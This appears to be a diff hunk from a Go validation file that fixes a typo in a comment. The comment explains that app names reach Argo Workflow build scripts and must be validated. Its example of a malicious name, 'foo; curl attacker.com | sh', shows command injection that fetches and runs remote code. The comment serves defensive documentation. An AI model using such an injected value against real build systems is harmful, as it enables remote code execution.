@@ -72,7 +72,7 @@ func ValidateAppPath(path string) error {
 // Kubernetes resource names, and container image tags.
 //
 // CODE-001 fix: app.Name flows into Argo Workflow shell scripts via
-// loopruntimePacksDockerfileStep() and buildctl arguments. Without validation,
+// loopRuntimePacksDockerfileStep() and buildctl arguments. Without validation,
 // a malicious app name like "foo; curl attacker.com | sh" enables RCE
 // in the build cluster.
 //
